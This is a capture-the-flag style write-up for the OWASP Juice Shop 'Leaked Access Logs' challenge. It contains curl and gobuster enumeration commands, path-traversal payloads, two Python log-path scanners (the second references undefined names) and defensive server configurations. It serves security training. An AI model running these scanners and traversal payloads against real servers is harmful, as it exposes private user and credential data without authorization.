# Leaked Access Logs Challenge - OWASP Juice Shop

## Complete Security Analysis and Exploitation Guide

---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Vulnerability Introduction](#vulnerability-introduction)
3. [CVSS Analysis](#cvss-analysis)
4. [Manual Exploitation](#manual-exploitation)
5. [Automated Python Script](#automated-python-script)
6. [Mitigation Strategies](#mitigation-strategies)
7. [References](#references)

---

## Challenge Overview

**Challenge Name**: Leaked Access Logs
**Difficulty**: ⭐⭐⭐ (3/6)
**Category**: Sensitive Data Exposure
**Target Instance**: https://juice5.wonkatech.org/#/ *(Change to your instance)*

**Objective**: Gain access to any access log file of the server.

---

## Vulnerability Introduction

### What are Leaked Access Logs?

**Access logs** contain detailed records of every HTTP request made to a web server, including:
- IP addresses of visitors
- Requested URLs and parameters
- User agents (browsers/tools used)
- Response codes and sizes
- Timestamps of requests
- Potentially sensitive data in URLs

**Log Exposure Vulnerability** occurs when:
1. **Web server logs are accessible** via HTTP requests
2. **Log files stored in web-accessible directories**
3. **Backup files with predictable names** left in web root
4. **Directory traversal** vulnerabilities expose system files
5. **Misconfigured server** serves log files as static content

### Real-World Impact

**Information Disclosure**:
- **User behavior patterns** - What pages users visit
- **Sensitive parameters** - Passwords, tokens, API keys in URLs
- **System information** - Server software versions, file paths
- **Attack attempts** - Failed login attempts, injection attempts
- **Business intelligence** - Traffic patterns, popular content

**Examples in the Wild**:
- **Apache access.log** exposed via misconfiguration
- **Application logs** stored in `/logs/` directory
- **Backup files** like `access.log.bak` in web root
- **Debug logs** containing database queries with sensitive data
- **Cloud storage buckets** with public read permissions

### Common Log File Locations

**Linux/Apache**:
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/nginx/access.log
```

**Web-accessible locations** (misconfigurations):
```
/logs/access.log
/log/access.log
/access.log
/access_log
/logs.txt
/access.txt
```

---

## CVSS Analysis

### CVSS v3.1 Score: 6.5 (Medium)

**Vector String**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

**Breakdown**:
- **Attack Vector (AV): Network (N)** - Exploitable over the network
- **Attack Complexity (AC): Low (L)** - Simple directory enumeration
- **Privileges Required (PR): None (N)** - No authentication required
- **User Interaction (UI): None (N)** - No user interaction needed
- **Scope (S): Unchanged (U)** - Impact limited to vulnerable component
- **Confidentiality (C): High (H)** - Access to sensitive log data
- **Integrity (I): None (N)** - Cannot modify data
- **Availability (A): None (N)** - No impact on system availability

**Simple Explanation**:
This is a **Medium-High severity** vulnerability because:
- 🔍 **Sensitive data exposure** - Access logs contain private information
- 🔍 **No authentication required** - Anyone can access if they find the path
- 🔍 **Intelligence gathering** - Attackers learn about system and users
- ⚠️ **Read-only impact** - Cannot modify system, only read logs
- ⚠️ **Depends on log content** - Impact varies based on what's logged

---

## Manual Exploitation

### Step 1: Reconnaissance

**Goal**: Identify potential log file locations and naming conventions.

**Common Log File Paths to Check**:
```
/access.log
/access_log
/logs/access.log
/log/access.log
/logs.txt
/access.txt
/server.log
/error.log
/debug.log
/app.log
/application.log
/apache.log
/nginx.log
```

### Step 2: Directory Enumeration

**Using Browser**:

1. **Try direct access** to common log paths:
   ```
   https://juice5.wonkatech.org/access.log
   https://juice5.wonkatech.org/logs/access.log
   https://juice5.wonkatech.org/access_log
   ```

2. **Check for backup files**:
   ```
   https://juice5.wonkatech.org/access.log.bak
   https://juice5.wonkatech.org/access.log.old
   https://juice5.wonkatech.org/access.log.1
   https://juice5.wonkatech.org/access.log~
   ```

**Using curl**:
```bash
# Test common log file locations
curl -I https://juice5.wonkatech.org/access.log
curl -I https://juice5.wonkatech.org/logs/access.log
curl -I https://juice5.wonkatech.org/access_log
curl -I https://juice5.wonkatech.org/server.log

# Check for backup variations
curl -I https://juice5.wonkatech.org/access.log.bak
curl -I https://juice5.wonkatech.org/access.log.old
curl -I https://juice5.wonkatech.org/access.log.1
```

### Step 3: Automated Directory Brute Force

**Using Dirb**:
```bash
# Install dirb
sudo apt install dirb

# Run directory brute force
dirb https://juice5.wonkatech.org/ /usr/share/dirb/wordlists/common.txt -o dirb_results.txt

# Look for log-related files
grep -i "log" dirb_results.txt
```

**Using Gobuster**:
```bash
# Install gobuster
go install github.com/OJ/gobuster/v3@latest

# Directory enumeration
gobuster dir -u https://juice5.wonkatech.org/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster_results.txt

# File enumeration with extensions
gobuster dir -u https://juice5.wonkatech.org/ -w /usr/share/wordlists/common.txt -x log,txt,bak,old
```

### Step 4: Application-Specific Analysis

**Juice Shop Specific Locations**:

Since Juice Shop is a Node.js application, check for:
```
/logs/access.log
/access_log
/juice-shop.log
/app.log
/npm-debug.log
/error.log
```

**Check Application Source**:

1. **Download main.js**:
   ```bash
   curl https://juice5.wonkatech.org/main.js -o main.js
   ```

2. **Search for log references**:
   ```bash
   grep -i "log" main.js | head -20
   grep -i "access" main.js | head -20
   grep -i "file" main.js | grep -i "log"
   ```

### Step 5: Exploitation Techniques

**Method 1: Direct Access**

Test each potential path until you find accessible logs:
```bash
# Test with different HTTP methods
curl -X GET https://juice5.wonkatech.org/access.log
curl -X HEAD https://juice5.wonkatech.org/access.log
curl -X OPTIONS https://juice5.wonkatech.org/access.log

# Test with different headers
curl -H "User-Agent: Mozilla/5.0" https://juice5.wonkatech.org/access.log
curl -H "Accept: text/plain" https://juice5.wonkatech.org/access.log
```

**Method 2: Directory Traversal**

Try path traversal to access system log files:
```bash
# Basic traversal
curl "https://juice5.wonkatech.org/../access.log"
curl "https://juice5.wonkatech.org/../../access.log"

# URL encoded traversal
curl "https://juice5.wonkatech.org/%2E%2E/access.log"
curl "https://juice5.wonkatech.org/%2E%2E%2Faccess.log"

# Double URL encoding
curl "https://juice5.wonkatech.org/%252E%252E/access.log"
```

**Method 3: Parameter-Based Access**

Some applications expose logs via URL parameters:
```bash
# Common parameter names
curl "https://juice5.wonkatech.org/?file=access.log"
curl "https://juice5.wonkatech.org/?log=access"
curl "https://juice5.wonkatech.org/?path=/var/log/access.log"
curl "https://juice5.wonkatech.org/admin?debug=logs"
```

**Method 4: Hidden Endpoints**

Check for administrative or debug endpoints:
```bash
# Admin endpoints
curl "https://juice5.wonkatech.org/admin/logs"
curl "https://juice5.wonkatech.org/admin/access.log"

# Debug endpoints
curl "https://juice5.wonkatech.org/debug/logs"
curl "https://juice5.wonkatech.org/_debug/access.log"

# Status/health endpoints
curl "https://juice5.wonkatech.org/status/logs"
curl "https://juice5.wonkatech.org/health/logs"
```

### Step 6: Analysis of Found Logs

**Once you find accessible logs, analyze them for**:

1. **Sensitive data in URLs**:
   ```
   GET /login?username=admin&password=secret123
   GET /api/users/123?token=abc123def456
   ```

2. **Attack patterns**:
   ```
   GET /admin' OR '1'='1' --
   GET /search?q=<script>alert('xss')</script>
   ```

3. **User behavior**:
   ```
   192.168.1.100 - GET /profile/user/123
   192.168.1.100 - GET /orders/456
   192.168.1.100 - GET /payment/methods
   ```

4. **System information**:
   ```
   Server: Apache/2.4.52 (Ubuntu)
   X-Powered-By: Express
   ```

---

## Automated Python Script

```python
#!/usr/bin/env python3
"""
Leaked Access Logs Challenge Solver
===================================
Automated discovery and access of server log files in Juice Shop.

Target: Juice Shop instance
Challenge: Gain access to server access logs

Usage:
    python3 leaked_logs_solver.py
"""

import requests
import time
import sys
import threading
from urllib.parse import urljoin, quote
from concurrent.futures import ThreadPoolExecutor

# ============================================================================
# CONFIGURATION - Change these values for your Juice Shop instance
# ============================================================================

# Change this URL to your Juice Shop instance
JUICE_SHOP_URL = "https://juice5.wonkatech.org"  # <-- CHANGE THIS

# Common log file paths to test
LOG_PATHS = [
    # Direct log files
    "access.log", "access_log", "logs/access.log", "log/access.log",
    "error.log", "error_log", "logs/error.log", "log/error.log",
    "server.log", "app.log", "application.log", "debug.log",
    "juice-shop.log", "npm-debug.log", "node.log",

    # Backup files
    "access.log.bak", "access.log.old", "access.log.1", "access.log~",
    "access_log.bak", "access_log.old", "logs.bak", "logs.old",

    # Text files
    "access.txt", "logs.txt", "server.txt", "log.txt",

    # Admin/debug paths
    "admin/logs", "admin/access.log", "admin/log",
    "debug/logs", "_debug/access.log", "status/logs",

    # Hidden directories
    ".logs/access.log", "logs/.access.log", "_logs/access.log",

    # Development files
    "logs/development.log", "logs/debug.log", "tmp/access.log",
]

# Directory traversal payloads
TRAVERSAL_PAYLOADS = [
    "../access.log",
    "../../access.log",
    "../../../access.log",
    "..%2Faccess.log",
    "..%2F..%2Faccess.log",
    "%2E%2E/access.log",
    "%2E%2E%2Faccess.log",
    "%252E%252E/access.log",
    "....//access.log",
    "..;/access.log",
]

# Common log file extensions
LOG_EXTENSIONS = ["log", "txt", "bak", "old", "1", "2", "gz"]

# ============================================================================

class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class LeakedLogsSolver:
    """Leaked Access Logs Challenge solver"""

    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })

        self.found_logs = []
        self.tested_paths = 0

    def print_banner(self):
        """Print challenge banner"""
        print(f"\n{Colors.BOLD}{Colors.HEADER}{'='*70}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.HEADER}  LEAKED ACCESS LOGS CHALLENGE SOLVER{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.HEADER}{'='*70}{Colors.ENDC}\n")
        print(f"{Colors.CYAN}Target: {Colors.BOLD}{self.base_url}{Colors.ENDC}")
        print(f"{Colors.CYAN}Objective: Find accessible server log files{Colors.ENDC}\n")

    def test_log_path(self, path):
        """Test if a log file path is accessible"""
        url = urljoin(self.base_url, path)

        try:
            response = self.session.get(url, timeout=5)
            self.tested_paths += 1

            # Check if response looks like a log file
            if response.status_code == 200:
                content = response.text[:1000]  # First 1000 chars

                # Log file indicators
                log_indicators = [
                    # Common log formats
                    'GET /', 'POST /', 'PUT /', 'DELETE /',
                    # IP addresses
                    r'\d+\.\d+\.\d+\.\d+',
                    # HTTP status codes
                    ' 200 ', ' 404 ', ' 500 ', ' 403 ',
                    # User agents
                    'Mozilla/', 'curl/', 'wget/',
                    # Apache log format
                    '"GET /', '"POST /',
                    # Nginx log format
                    'nginx', 'apache',
                    # Timestamps
                    '[', '] ', ' - - '
                ]

                content_lower = content.lower()
                indicator_count = sum(1 for indicator in log_indicators
                                    if indicator.lower() in content_lower)

                # Consider it a log file if multiple indicators present
                if (indicator_count >= 3 or
                    'access_log' in content_lower or
                    'error_log' in content_lower or
                    len([line for line in content.split('\n')[:10]
                         if any(method in line for method in ['GET', 'POST', 'PUT'])]) >= 2):

                    log_info = {
                        'path': path,
                        'url': url,
                        'size': len(response.content),
                        'preview': content[:200] + '...' if len(content) > 200 else content,
                        'indicators': indicator_count
                    }

                    self.found_logs.append(log_info)

                    print(f"   {Colors.GREEN}✅ FOUND LOG FILE: {path}{Colors.ENDC}")
                    print(f"      URL: {url}")
                    print(f"      Size: {len(response.content):,} bytes")
                    print(f"      Preview: {content[:100]}...")
                    return True

        except requests.exceptions.RequestException:
            pass  # Silently continue for failed requests

        return False

    def enumerate_log_files(self):
        """Enumerate potential log file locations"""
        print(f"{Colors.CYAN}🔍 Enumerating log file locations...{Colors.ENDC}")

        # Test basic paths first
        print(f"{Colors.CYAN}📁 Testing common log paths...{Colors.ENDC}")
        for path in LOG_PATHS:
            if self.test_log_path(path):
                print(f"{Colors.GREEN}🎯 CHALLENGE SOLVED! Found accessible log: {path}{Colors.ENDC}")
                return True

            if self.tested_paths % 20 == 0:
                print(f"   Tested {self.tested_paths} paths...")

        # Test directory traversal
        print(f"\n{Colors.CYAN}🔀 Testing directory traversal...{Colors.ENDC}")
        for payload in TRAVERSAL_PAYLOADS:
            if self.test_log_path(payload):
                print(f"{Colors.GREEN}🎯 CHALLENGE SOLVED! Found log via traversal: {payload}{Colors.ENDC}")
                return True

        # Test with different extensions
        print(f"\n{Colors.CYAN}📄 Testing different extensions...{Colors.ENDC}")
        base_names = ["access", "server", "app", "application", "error"]
        for base_name in base_names:
            for extension in LOG_EXTENSIONS:
                path = f"{base_name}.{extension}"
                if self.test_log_path(path):
                    print(f"{Colors.GREEN}🎯 CHALLENGE SOLVED! Found log: {path}{Colors.ENDC}")
                    return True

        return False

    def analyze_log_content(self, log_info):
        """Analyze found log file for sensitive information"""
        print(f"\n{Colors.CYAN}🔬 Analyzing log content for sensitive data...{Colors.ENDC}")

        try:
            url = log_info['url']
            response = self.session.get(url)
            content = response.text

            # Look for sensitive patterns
            sensitive_patterns = {
                'Passwords in URLs': [
                    r'password=([^&\s]+)',
                    r'pass=([^&\s]+)',
                    r'pwd=([^&\s]+)'
                ],
                'API Keys/Tokens': [
                    r'token=([^&\s]+)',
                    r'key=([^&\s]+)',
                    r'api[_-]key=([^&\s]+)'
                ],
                'Email Addresses': [
                    r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
                ],
                'IP Addresses': [
                    r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                ],
                'SQL Injection Attempts': [
                    r"'.*OR.*'.*='",
                    r"UNION.*SELECT",
                    r"DROP.*TABLE"
                ],
                'XSS Attempts': [
                    r'<script.*?>',
                    r'javascript:',
                    r'onload.*='
                ]
            }

            findings = {}
            for category, patterns in sensitive_patterns.items():
                matches = []
                for pattern in patterns:
                    import re
                    found = re.findall(pattern, content, re.IGNORECASE)
                    matches.extend(found[:5])  # Limit to first 5 matches

                if matches:
                    findings[category] = list(set(matches))  # Remove duplicates

            # Print analysis results
            if findings:
                print(f"{Colors.GREEN}🔍 Sensitive data found in logs:{Colors.ENDC}")
                for category, items in findings.items():
                    print(f"   {Colors.YELLOW}{category}:{Colors.ENDC}")
                    for item in items[:3]:  # Show first 3
                        print(f"      - {item}")
            else:
                print(f"{Colors.YELLOW}⚠️  No obvious sensitive data patterns found{Colors.ENDC}")

            # Log statistics
            lines = content.split('\n')
            print(f"\n{Colors.CYAN}📊 Log Statistics:{Colors.ENDC}")
            print(f"   Total lines: {len(lines):,}")
            print(f"   File size: {len(content):,} bytes")
            print(f"   Unique IPs: {len(set(re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', content)))}")

            return findings

        except Exception as e:
            print(f"{Colors.RED}❌ Failed to analyze log content: {e}{Colors.ENDC}")
            return {}

    def solve_challenge(self):
        """Main method to solve the leaked access logs challenge"""
        self.print_banner()

        # Enumerate log files
        success = self.enumerate_log_files()

        if success and self.found_logs:
            print(f"\n{Colors.GREEN}{Colors.BOLD}🎉 LEAKED ACCESS LOGS CHALLENGE COMPLETED!{Colors.ENDC}")
            print(f"{Colors.GREEN}Found {len(self.found_logs)} accessible log file(s):{Colors.ENDC}")

            for log in self.found_logs:
                print(f"\n   {Colors.CYAN}📄 {log['path']}{Colors.ENDC}")
                print(f"      URL: {log['url']}")
                print(f"      Size: {log['size']:,} bytes")

                # Analyze the first found log
                if log == self.found_logs[0]:
                    self.analyze_log_content(log)

            return True
        else:
            print(f"\n{Colors.RED}❌ No accessible log files found{Colors.ENDC}")
            print(f"{Colors.YELLOW}Tested {self.tested_paths} potential paths{Colors.ENDC}")

        return False


def main():
    """Main entry point"""
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        # Use default URL - CHANGE THIS FOR YOUR INSTANCE
        base_url = JUICE_SHOP_URL

    print(f"{Colors.YELLOW}🎯 Starting Leaked Access Logs Challenge{Colors.ENDC}")
    print(f"{Colors.YELLOW}Target: {base_url}{Colors.ENDC}")

    solver = LeakedLogsSolver(base_url)
    success = solver.solve_challenge()

    if not success:
        print(f"\n{Colors.CYAN}💡 Manual alternatives:{Colors.ENDC}")
        print(f"1. Check robots.txt for disallowed paths")
        print(f"2. Use directory enumeration tools (dirb, gobuster)")
        print(f"3. Try parameter-based file access (?file=access.log)")
        print(f"4. Check for backup files (.bak, .old, .1)")
        print(f"5. Test directory traversal (../access.log)")
        print(f"6. Look in application source code for log references")

        print(f"\n{Colors.CYAN}🔧 Manual testing commands:{Colors.ENDC}")
        print(f"curl -I {base_url}/access.log")
        print(f"curl -I {base_url}/logs/access.log")
        print(f"curl {base_url}/access_log")

if __name__ == '__main__':
    main()
```

### Enhanced Script with Parallel Testing

```python
#!/usr/bin/env python3
"""
Advanced Leaked Logs Scanner
============================
High-performance scanner with parallel testing and advanced evasion techniques.
"""

import requests
import time
import sys
import threading
import re
from urllib.parse import urljoin, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================================
# CONFIGURATION - Change for your instance
# ============================================================================

JUICE_SHOP_URL = "https://juice5.wonkatech.org"  # <-- CHANGE THIS

class AdvancedLogScanner:
    """Advanced log file scanner with parallel processing"""

    def __init__(self, base_url, max_workers=20):
        self.base_url = base_url.rstrip('/')
        self.max_workers = max_workers
        self.found_logs = []
        self.tested_count = 0

        # Create session with retries
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            max_retries=requests.packages.urllib3.util.retry.Retry(
                total=3,
                backoff_factor=0.1,
                status_forcelist=[500, 502, 503, 504]
            )
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

    def generate_log_paths(self):
        """Generate comprehensive list of potential log paths"""
        paths = set(LOG_PATHS)  # Start with basic paths

        # Add parameterized paths
        for base_path in ["", "admin/", "debug/", "_debug/", "logs/"]:
            for log_name in ["access", "server", "app", "error", "debug"]:
                for ext in LOG_EXTENSIONS:
                    paths.add(f"{base_path}{log_name}.{ext}")

        # Add traversal variations
        for payload in TRAVERSAL_PAYLOADS:
            paths.add(payload)

        return list(paths)

    def test_single_path(self, path):
        """Test a single log path"""
        url = urljoin(self.base_url, path)

        try:
            response = self.session.get(url, timeout=10)
            self.tested_count += 1

            if response.status_code == 200:
                content = response.text[:2000]

                # Enhanced log detection
                if self.is_log_file(content):
                    return {
                        'path': path,
                        'url': url,
                        'size': len(response.content),
                        'content_preview': content[:500]
                    }

        except:
            pass

        return None

    def is_log_file(self, content):
        """Determine if content looks like a log file"""
        # Count log indicators
        indicators = 0

        # HTTP methods
        if re.search(r'\b(GET|POST|PUT|DELETE|HEAD|OPTIONS)\b', content):
            indicators += 2

        # Status codes
        if re.search(r'\b(200|404|500|403|301|302)\b', content):
            indicators += 1

        # IP addresses
        if re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', content):
            indicators += 2

        # User agents
        if re.search(r'Mozilla/|curl/|wget/|python-requests/', content):
            indicators += 1

        # Log timestamps
        if re.search(r'\[\d{2}/', content) or re.search(r'\d{4}-\d{2}-\d{2}', content):
            indicators += 1

        # Log separators
        if ' - ' in content or '" ' in content:
            indicators += 1

        return indicators >= 4

    def parallel_scan(self):
        """Perform parallel scanning of log paths"""
        print(f"{Colors.CYAN}🚀 Starting parallel log file scan...{Colors.ENDC}")

        paths = self.generate_log_paths()
        print(f"   Testing {len(paths)} potential paths with {self.max_workers} threads")

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # Submit all tasks
            future_to_path = {executor.submit(self.test_single_path, path): path
                             for path in paths}

            # Process results as they complete
            for future in as_completed(future_to_path):
                try:
                    result = future.result()
                    if result:
                        self.found_logs.append(result)
                        print(f"   {Colors.GREEN}✅ FOUND: {result['path']}{Colors.ENDC}")

                        # Stop on first success for this challenge
                        print(f"\n{Colors.GREEN}🎯 CHALLENGE SOLVED!{Colors.ENDC}")
                        return True

                except Exception as e:
                    pass

                # Progress update
                if self.tested_count % 50 == 0:
                    print(f"   Tested {self.tested_count}/{len(paths)} paths...")

        return len(self.found_logs) > 0

    def solve_challenge(self):
        """Main method to solve the challenge"""
        self.print_banner()

        success = self.parallel_scan()

        if success:
            print(f"\n{Colors.GREEN}{Colors.BOLD}🎉 LEAKED ACCESS LOGS CHALLENGE COMPLETED!{Colors.ENDC}")

            for log in self.found_logs:
                print(f"\n{Colors.GREEN}📄 Log File Found:{Colors.ENDC}")
                print(f"   Path: {log['path']}")
                print(f"   URL: {log['url']}")
                print(f"   Size: {log['size']:,} bytes")
                print(f"\n{Colors.CYAN}🔍 Content Preview:{Colors.ENDC}")
                print(f"   {log['content_preview'][:300]}...")
        else:
            print(f"\n{Colors.RED}❌ No accessible log files found{Colors.ENDC}")

        return success

if __name__ == '__main__':
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = JUICE_SHOP_URL

    scanner = AdvancedLogScanner(target_url)
    scanner.solve_challenge()
```

---

## Mitigation Strategies

### 1. Secure Log File Management

**Proper Log File Placement**:

```bash
# GOOD - Outside web root
/var/log/apache2/access.log
/var/log/application/app.log
/opt/app/logs/access.log

# BAD - Inside web root (publicly accessible)
/var/www/html/access.log
/var/www/html/logs/access.log
```

**Apache Configuration**:
```apache
# Deny access to log files
<FilesMatch "\.(log|txt)$">
    Require all denied
</FilesMatch>

# Deny access to backup files
<FilesMatch "\.(bak|old|backup|tmp)$">
    Require all denied
</FilesMatch>

# Deny access to specific directories
<Directory "/var/www/html/logs">
    Require all denied
</Directory>
```

**Nginx Configuration**:
```nginx
# Deny access to log files
location ~* \.(log|txt|bak)$ {
    deny all;
    return 404;
}

# Deny access to logs directory
location /logs/ {
    deny all;
    return 404;
}

# Hide server information
server_tokens off;
```

### 2. Log Rotation and Archival

```bash
# Logrotate configuration (/etc/logrotate.d/application)
/opt/app/logs/*.log {
    daily                    # Rotate daily
    missingok               # Don't error if log missing
    rotate 30               # Keep 30 days
    compress                # Compress old logs
    delaycompress           # Compress on next rotation
    notifempty              # Don't rotate empty logs
    copytruncate            # Truncate original log file
    create 0640 www-data www-data  # Create new log with restricted permissions
    postrotate
        # Move logs outside web root after rotation
        mv /opt/app/logs/*.gz /var/log/archived/ 2>/dev/null || true
        systemctl reload apache2
    endscript
}
```

### 3. Secure Logging Practices

**Sanitize Sensitive Data**:

```javascript
const winston = require('winston');

// Custom format to sanitize logs
const sanitizeFormat = winston.format.printf(({ timestamp, level, message, ...meta }) => {
    // Remove sensitive data from logs
    let sanitizedMessage = message;

    // Remove passwords
    sanitizedMessage = sanitizedMessage.replace(/password=[^&\s]+/gi, 'password=***');

    // Remove tokens
    sanitizedMessage = sanitizedMessage.replace(/token=[^&\s]+/gi, 'token=***');

    // Remove API keys
    sanitizedMessage = sanitizedMessage.replace(/api[_-]?key=[^&\s]+/gi, 'apikey=***');

    // Remove credit card numbers
    sanitizedMessage = sanitizedMessage.replace(/\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/g, '****-****-****-****');

    return `${timestamp} [${level}] ${sanitizedMessage}`;
});

const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        sanitizeFormat
    ),
    transports: [
        // Logs outside web root
        new winston.transports.File({ filename: '/var/log/app/error.log', level: 'error' }),
        new winston.transports.File({ filename: '/var/log/app/combined.log' })
    ]
});

// Express logging middleware
app.use((req, res, next) => {
    // Log request (with sanitization)
    const logData = {
        ip: req.ip,
        method: req.method,
        url: req.url.replace(/password=[^&]+/gi, 'password=***'), // Sanitize URL
        userAgent: req.get('User-Agent'),
        timestamp: new Date().toISOString()
    };

    logger.info('HTTP Request', logData);
    next();
});
```

### 4. Access Control and Monitoring

**File System Permissions**:

```bash
# Set restrictive permissions on log files
chmod 640 /var/log/app/*.log          # rw-r-----
chown www-data:adm /var/log/app/*.log  # Owner: www-data, Group: adm

# Remove other users' access
find /var/log/app -name "*.log" -exec chmod o-rwx {} \;

# Set directory permissions
chmod 750 /var/log/app                # rwxr-x---
```

**Log Access Monitoring**:

```javascript
const fs = require('fs');
const path = require('path');

// Monitor log file access
function setupLogAccessMonitoring() {
    const logDirectory = '/var/log/app';

    fs.watch(logDirectory, (eventType, filename) => {
        if (filename && filename.endsWith('.log')) {
            const filePath = path.join(logDirectory, filename);

            fs.stat(filePath, (err, stats) => {
                if (!err) {
                    // Log access attempt
                    logger.warn('Log file accessed', {
                        file: filename,
                        accessTime: stats.atime,
                        eventType: eventType,
                        timestamp: new Date().toISOString()
                    });

                    // Alert on suspicious access
                    alertSecurityTeam('Log file access detected', {
                        file: filename,
                        time: new Date().toISOString()
                    });
                }
            });
        }
    });
}

// Implement honeypot log files
function createHoneypotLogs() {
    const honeypotPaths = [
        '/var/www/html/access.log',
        '/var/www/html/logs/debug.log'
    ];

    honeypotPaths.forEach(honeypotPath => {
        const honeypotContent = `
# Honeypot log file - Access logged and monitored
# Any access to this file triggers security alerts
127.0.0.1 - - [${new Date().toISOString()}] "GET / HTTP/1.1" 200 1234 "Honeypot accessed"
        `.trim();

        fs.writeFileSync(honeypotPath, honeypotContent);

        // Monitor honeypot access
        fs.watchFile(honeypotPath, (curr, prev) => {
            if (curr.atime !== prev.atime) {
                logger.error('SECURITY ALERT: Honeypot log file accessed', {
                    file: honeypotPath,
                    accessTime: curr.atime,
                    previousAccess: prev.atime
                });

                // Immediate security response
                triggerSecurityAlert('Log file honeypot accessed');
            }
        });
    });
}
```

### 5. Centralized Logging

**Secure Log Aggregation**:

```javascript
// Use external logging service
const winston = require('winston');
const { ElasticsearchTransport } = require('winston-elasticsearch');

const logger = winston.createLogger({
    level: 'info',
    format: winston.format.json(),
    defaultMeta: { service: 'juice-shop' },
    transports: [
        // Local file (outside web root)
        new winston.transports.File({
            filename: '/var/log/app/error.log',
            level: 'error'
        }),

        // Elasticsearch for centralized logging
        new ElasticsearchTransport({
            level: 'info',
            clientOpts: { host: 'https://elasticsearch.company.com' },
            index: 'application-logs'
        }),

        // Syslog for system integration
        new winston.transports.Syslog({
            host: 'syslog.company.com',
            port: 514,
            protocol: 'udp4',
            facility: 'local0'
        })
    ]
});

// Forward logs to SIEM
function forwardToSIEM(logData) {
    // Send to Security Information and Event Management system
    fetch('https://siem.company.com/api/logs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            timestamp: new Date().toISOString(),
            source: 'juice-shop',
            event_type: 'http_request',
            data: logData
        })
    });
}
```

---

## References

### NIST Guidelines

**NIST SP 800-92 (Guide to Computer Security Log Management)**:
- Section 3: Log Management Planning
- Section 4: Log Management Operational Processes
- Section 5: Log Analysis and Monitoring
- Appendix G: Log Management Tools and Technologies

**NIST SP 800-53 Controls**:
- **AU-2**: Auditable Events - Define what to log
- **AU-3**: Content of Audit Records - What information to include
- **AU-4**: Audit Storage Capacity - Manage log storage
- **AU-6**: Audit Review, Analysis, and Reporting - Monitor logs
- **AU-9**: Protection of Audit Information - Secure log files
- **AU-11**: Audit Record Retention - How long to keep logs

**NIST Cybersecurity Framework**:
- **Identify (ID.AM)**: Asset Management - Know what generates logs
- **Protect (PR.DS)**: Data Security - Protect log files from unauthorized access
- **Detect (DE.AE)**: Anomalies and Events - Monitor log access patterns
- **Respond (RS.AN)**: Analysis - Investigate log access incidents

### OWASP Guidelines

**OWASP Top 10 2021**:
- **A01: Broken Access Control** - Unauthorized access to log files
- **A03: Injection** - Log injection attacks
- **A09: Security Logging and Monitoring Failures** - Inadequate logging practices

**OWASP Logging Security Cheat Sheet**:
- Log for security events, not just debugging
- Sanitize all data written to logs
- Store logs securely outside web root
- Monitor log access and integrity
- Implement log rotation and archival

**OWASP ASVS v4.0**:
- **V7.1**: Log Content Requirements
- **V7.2**: Log Processing Requirements
- **V7.3**: Log Protection Requirements
- **V7.4**: Error Handling and Logging Requirements

### Industry Standards

**ISO 27001:2013 Controls**:
- **A.12.4.1**: Event logging - Requirements for logging security events
- **A.12.4.2**: Protection of log information - Secure log storage and access
- **A.12.4.3**: Administrator and operator logs - Privileged user activity logging
- **A.12.4.4**: Clock synchronisation - Ensure accurate timestamps

**PCI DSS Requirements**:
- **Requirement 10**: Track and monitor all access to network resources and cardholder data
- **10.1**: Implement audit trails to link access to individual users
- **10.2**: Implement automated audit trails for system components
- **10.3**: Record audit trail entries for all system components
- **10.5**: Secure audit trails so they cannot be altered

**SANS Critical Security Controls**:
- **Control 6**: Maintenance, Monitoring and Analysis of Audit Logs
- **Control 8**: Malware Defenses
- **Control 11**: Data Recovery Capabilities
- **Control 13**: Data Protection

### Security Resources

**Documentation**:
- [NIST Logging Guide](https://csrc.nist.gov/publications/detail/sp/800-92/final)
- [OWASP Logging Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)
- [SANS Logging Best Practices](https://www.sans.org/white-papers/32949/)
- [RFC 3164: The BSD Syslog Protocol](https://tools.ietf.org/html/rfc3164)

**Tools**:
- [Dirb](http://dirb.sourceforge.net/) - Directory enumeration
- [Gobuster](https://github.com/OJ/gobuster) - Fast directory brute forcer
- [Burp Suite](https://portswigger.net/burp) - Manual testing and crawling
- [OWASP ZAP](https://www.zaproxy.org/) - Automated scanning

**Log Analysis Tools**:
- [Elasticsearch, Logstash, and Kibana (ELK Stack)](https://www.elastic.co/what-is/elk-stack)
- [Splunk](https://www.splunk.com/) - Enterprise log analysis
- [Graylog](https://www.graylog.org/) - Open-source log management
- [Fluentd](https://www.fluentd.org/) - Log collection and forwarding

**Training Resources**:
- [SANS FOR572](https://www.sans.org/cyber-security-courses/advanced-network-forensics-incident-response/) - Network forensics and log analysis
- [SANS SEC511](https://www.sans.org/cyber-security-courses/continuous-monitoring-security-tuning/) - Security monitoring and logging
